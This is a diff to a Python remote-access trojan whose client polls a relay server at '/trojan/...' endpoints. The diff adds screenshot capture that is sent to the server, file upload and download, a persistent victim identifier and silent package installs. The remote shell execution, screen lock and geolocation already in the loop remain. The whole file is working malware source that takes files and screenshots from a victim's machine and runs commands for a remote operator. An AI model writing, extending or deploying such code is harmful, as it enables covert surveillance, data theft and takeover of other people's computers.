@@ -19,6 +19,12 @@ try:
 except ImportError:
     os.system('pip install requests')
     import requests
+try:
+    import pyautogui
+except ImportError:
+    os.system('pip install pyautogui')
+    import pyautogui
+
 with open('log.txt', 'a') as f:
     f.write('\n[INFO] (Done 2) "Download imports"')
 
@@ -42,11 +48,12 @@ except ImportError:
         os.system('git clone https://github.com/DenisCarriere/geocoder')
         os.chdir('geocoder')
         os.system('python3 setup.py install')
+
 class Socket:
     def __init__(self):
         self.role = None
         self.address = None
-        self.base_url = 'https://stonevalley.pythonanywhere.com'
+        self.base_url = 'http://127.0.0.1:3744'
 
     def connect(self, addr=None):
         if addr:
@@ -89,9 +96,34 @@ class Socket:
         resp = requests.get(f'{self.base_url}/trojan/recv/{self.address}/{self.role}')
         return resp.json()['data'] if resp.json()['success'] else None
 
+    def send_file(self, file_path):
+        with open(file_path, 'rb') as f:
+            files = {'file': f}
+            resp = requests.post(f'{self.base_url}/trojan/upload/{self.address}/{self.role}', files=files)
+        return resp.json()
+
+    def recv_file(self, save_path):
+        resp = requests.get(f'{self.base_url}/trojan/download/{self.address}/{self.role}', stream=True)
+        if resp.status_code == 200 and 'attachment' in resp.headers.get('Content-Disposition', ''):
+            with open(save_path, 'wb') as f:
+                for chunk in resp.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+            return True
+        else:
+            return False
+
     def close(self):
         resp = requests.get(f'{self.base_url}/trojan/close/{self.address}/{self.role}')
         return resp.json()['success']
+
+    def destroy(self, address): #CUSTOM
+        resp = requests.get(f'{self.base_url}/trojan/close/{address}/server')
+        return resp.json()['success']
+
+
+
+
 with open('log.txt', 'a') as f:
     f.write('\n[INFO] (Done 4) "1.Load Geocoder 2.Set classes"')
 
@@ -101,11 +133,15 @@ with open('log.txt', 'a') as f:
 
 
 host = socket.gethostbyname(socket.gethostname())
-address = f'EA0001-{os.name}-{socket.gethostname()}' # WARNING, check in the client before setting address
-# each address should be unique
-
+if os.path.exists('addr.txt'):
+    with open('addr.txt', 'r') as rf:
+        address = rf.read()
+else:
+    address = str(random.randint(10101,909090))+'-'+f'{os.name}'+'-'+(socket.gethostname())
+    with open('addr.txt', 'w') as rf:
+        rf.write(address)
 with open('log.txt', 'a') as f:
-    f.write('\n[INFO] (Done 6) "Predefined Server_Address is set"')
+    f.write('\n[INFO] (Done 6) "Saved Server_Address to file"')
 
 if 'object.pkl' in os.listdir():
     with open('log.txt', 'a') as f:
@@ -138,41 +174,15 @@ if 'object.pkl' in os.listdir():
         except Exception as e3:
             with open('log.txt', 'a') as f:
                 f.write(f'\n[Error] (Error 7.3) "Binding failed! QUITTING...": {e3}')
+
             exit(-1)
         else:
+
             if r:
                 file = open('object.pkl', 'wb')
                 pickle.dump(sock, file)
                 with open('log.txt', 'a') as f:
-                    f.write('\n[Done] (Done 7.3) "Bound a new socket"')
-            else: # the predefined Enterprise Account socket must be on
-                # close the previous buggy socket
-                with open('log.txt', 'a') as f:
-                    f.write('\n[WAIT] (Doing 7.3) "Closing existing buggy socket"')
-                resp = requests.get(f'{sock.base_url}/trojan/close/virat-{address}/server')
-                if str(resp.json()['success']) == 'True':
-                    with open('log.txt', 'a') as f:
-                        f.write('\n[Done] (Done 7.3) "Socket closed"')
-                    with open('log.txt', 'a') as f:
-                        f.write('\n[WAIT] (Doing 7.4) "Binding new socket again"')
-                    sock = Socket()
-                    try:
-                        r = sock.bind(f'virat-{address}')
-                    except Exception as e3:
-                        with open('log.txt', 'a') as f:
-                            f.write(f'\n[Error] (Error 7.4) "Binding failed! QUITTING...": {e3}')
-
-                        exit(-1)
-                    else:
-                        if r:
-                            with open('log.txt', 'a') as f:
-                                f.write(f'\n[Done] (Done 7.4) "Socket Bound!": ')
-                        else:
-                            with open('log.txt', 'a') as f:
-                                f.write(f'\n[Error] (Error 7.4) "Binding failed! No reason"')
-                else:
-                    with open('log.txt', 'a') as f:
-                        f.write(f'\n[Error] (Error 7.3) "Cant close previous socket.": {resp.json()["message"]}')
+                    f.write('\n[Done] (Doing 7.3) "Bound a new socket"')
 
 
 
@@ -227,6 +237,15 @@ def get_location():
     return (result['latitude']),(result['longitude']),("\033[1;95mCountry: \033[1;97m" + result['country_name'] +
             ", \033[1;95mState: \033[1;97m" + result['state'] +
             ", \033[1;95mCity: \033[1;97m" + result['city'])
+
+
+def screenshot():
+    shot = pyautogui.screenshot()
+    save = f'screen{random.randint(0, 1000)}.png'
+    shot.save(save)
+    return save
+
+
 with open('log.txt', 'a') as f:
     f.write('\n[DONE] (Done 10) "Sent host-id"')
 
@@ -236,12 +255,37 @@ try:
     while True:
         try:
             data = sock.recv()
-        except Exception or KeyboardInterrupt:
+        except (Exception or KeyboardInterrupt):
             data = None
         if data == "%authorized%":
             auth = True
         if auth:
-            if '%SHELL%' in str(data):
+            if "%NOWUPLOAD%" in str(data):
+                save_path = str(data).replace('%NOWUPLOAD%', '')
+                _timeout = 0
+                while True:
+                    try:
+                        r = sock.recv_file(save_path)
+                        if r:
+                            break
+                    except (Exception or KeyboardInterrupt) as e:
+                        print(e)
+                    finally:
+                        _timeout +=1
+                        if _timeout > 10:
+                            break
+            elif "%NOWDOWNLOAD%" in str(data):
+                file_path = str(data).replace('%NOWDOWNLOAD%', '')
+                sock.send_file(file_path)
+            elif "%SCREENSHOT%" in str(data):
+                path = screenshot()
+                sock.send_file(path)
+                try:
+                    os.remove(path)
+                except Exception:
+                    with open('log.txt', 'a') as f:
+                        f.write(f'\n[Alert] (Alert 11) "delete {path} manually, else it will cause errors!"')
+            elif '%SHELL%' in str(data):
                 data = data.split('%SHELL%')[1]
                 if data in ['$lock', '$location']:
                     if data == '$lock':
@@ -264,11 +308,11 @@ try:
                         if len(output) < 1:
                             output = 'Successfully Executed'
                         sock.send(str(output))
-except (Exception or InterruptedError or KeyboardInterrupt):
+except (Exception or InterruptedError or KeyboardInterrupt) as e:
     with open('object.pkl', 'wb') as file:
         pickle.dump(sock, file)
     with open('log.txt', 'a') as f:
-        f.write('\n[DONE] (Done 11) "Closing after running commands"')
+        f.write(f'\n[DONE] (Done 11) "Closing after running commands": {e}')
 
     sock.close()
     quit(-1)
